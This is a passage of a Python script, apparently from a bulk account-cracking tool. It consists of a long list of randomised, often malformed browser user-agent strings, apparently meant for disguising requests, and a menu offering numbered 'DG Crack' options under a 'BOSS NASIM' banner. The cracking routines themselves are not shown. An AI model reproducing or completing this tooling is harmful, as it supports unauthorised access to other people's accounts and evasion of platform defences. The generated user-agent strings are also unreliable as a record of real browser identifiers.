Gecko)102.0.4668.141 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A325M) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4331.69 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A163W) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4559.99 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A989A) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4809.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)I202A) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4606.45 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)N401W) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4371.71 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)W384S) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4559.60 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J417F) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4415.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)R271G) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4669.86 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)U487J) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4789.133 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)J748P) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4725.85 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Z695M) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4498.85 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)P676U) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4403.72 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)W958C) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4605.115 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)U545M) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4466.148 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A713U) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4254.46 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)B687P) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4394.106 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)H674W) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4725.129 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)C733U) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4497.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)O607D) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4425.83 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)L877W) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4773.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)P105Y) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4338.114 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)R330V) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4273.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)W26O) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4670.136 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)P297J) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4477.112 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A4R) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4226.111 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)D648X) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4820.78 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)S903F) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4251.122 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)M14R) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4707.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)U221B) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4633.60 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)H501C) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4233.117 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)N473I) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4825.142 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)W282B) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4294.65 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)C929O) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4847.57 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)J541T) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4725.135 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)U209J) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4435.141 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)O165D) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4674.68 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)P420W) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4436.102 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)O109Z) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4796.123 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A25P) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4685.99 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)N756U) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4581.94 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Y733L) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4605.69 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)I663X) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4714.147 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)C782R) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4447.103 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)D844L) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4532.96 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A159A) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4418.76 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)M439C) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4258.133 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)P589Q) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4487.93 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)F104A) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4879.89 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)X323Y) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4845.85 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)D766P) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4526.134 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)I419C) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4578.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)B955K) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4533.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)G175G) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4446.122 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)C191W) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4899.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Y369T) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4437.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)G704I) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4706.66 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)I954X) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4814.89 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A963W) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4660.76 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)E843S) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4535.108 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)S625P) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4368.104 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)W438P) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4422.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)U492V) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4327.124 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)P328F) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4772.83 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)N590Q) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4821.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)T132K) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4626.52 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A624Z) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4603.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)E231N) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4561.109 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)E982A) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4653.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)P797R) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4608.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)V440P) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4866.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)X857Y) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4340.45 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)H91P) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4430.89 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)X360Z) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4526.126 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Y604V) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4205.123 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)W690L) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4501.60 Chrome/105.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/110.0.1587.69','Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Vivaldi/5.7.2921.63','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/110.0.1587.69','Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 Edge/40.15254.603','Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edge/44.18363.8131','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.367.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36','Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36 Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36 Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1464.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1500.55 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.90 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.15 (KHTML, like Gecko) Chrome/24.0.1295.0 Safari/537.15','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1290.1 Safari/537.13','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1284.0 Safari/537.13','Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.26 Safari/537.11','Mozilla/5.0 (Windows NT 6.0) yi; AppleWebKit/345667.12221 (KHTML, like Gecko) Chrome/23.0.1271.26 Safari/453667.1221','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.17 Safari/537.11','Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4','Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.813.0 Safari/535.1','Mozilla/5.0 (Windows NT 5.2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.813.0 Safari/535.1','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.724.100 Safari/534.30','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.813.0 Safari/535.1','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.814.0 Safari/535.1','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.815.0 Safari/535.1','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.815.10913 Safari/535.1','Chrome/15.0.860.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/15.0.860.0','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.860.0 Safari/535.2','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.861.0 Safari/535.2','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.864.0 Safari/535.2','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.864.0 Safari/535.2','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.872.0 Safari/535.2','Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6','Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7','Mozilla/5.0 (Windows NT 5.2; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.63 Safari/535.7','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.8 (KHTML, like Gecko) Chrome/16.0.912.63 Safari/535.8','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.63 Safari/535.7xs5D9rRDFpg2g','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.2 (KHTML, like Gecko) Chrome/22.0.1216.0 Safari/537.2','Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.75 Safari/535.7','Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.75 Safari/535.7','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.77 Safari/535.7ad-imcjapan-syosyaman-xkgi3lqg03!wgz','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11','Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.8 (KHTML, like Gecko) Chrome/17.0.940.0 Safari/535.8','Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11','Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11','Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0','Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3','Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3','Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1','Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6']

current = datetime.now()

#############

def menu():

    _EMRAN_('clear')

    logo()

    print("")

    print('\033[1;90m╔══[\033[1;91m\033[47m01\x1b[0m\033[1;90m] \033[1;97m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗡𝗔𝗦𝗜𝗠𝄟⃝ \033[1;91m06 𝑫𝑮 𝑪𝒓𝒂𝒄𝒌  ')

    print('\033[1;90m╠══[\033[1;92m\033[47m02\x1b[0m\033[1;90m] \033[1;97m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗡𝗔𝗦𝗜𝗠𝄟⃝ \033[1;92m07 𝑫𝑮 𝑪𝒓𝒂𝒄𝒌')

    print('\033[1;90m╠══[\033[1;93m\033[47m03\x1b[0m\033[1;90m] \033[1;97m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗡𝗔𝗦𝗜𝗠𝄟⃝ \033[1;93m08 𝑫𝑮 𝑪𝒓𝒂𝒄𝒌')

    print('\033[1;90m╠══[\033[1;94m\033[47m04\x1b[0m\033[1;90m]\033[1;97m 🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗡𝗔𝗦𝗜𝗠𝄟⃝ \033[1;94m09 𝑫𝑮 𝑪𝒓𝒂𝒄𝒌')

    print('\033[1;90m╠══[\033[1;95m\033[47m05\x1b[0m\033[1;90m] \033[1;97m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗡𝗔𝗦𝗜𝗠𝄟⃝ \033[1;95m10 𝑫𝑮 𝑪𝒓𝒂𝒄𝒌')

    print('\033[1;90m╠══[\033[1;96m\033[47m06\x1b[0m\033[1;90m]\033[1;97m 🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗡𝗔𝗦𝗜𝗠𝄟⃝ \033[1;96m11 𝑫𝑮 𝑪𝒓𝒂𝒄𝒌')

    print('\033[1;90m╚══[\033[1;90m\033[47m00\x1b[0m\033[1;90m]\033[1;90m 𝑩𝒂𝒄𝒌 𝑻𝒐 𝑴𝒆𝒏𝒖')

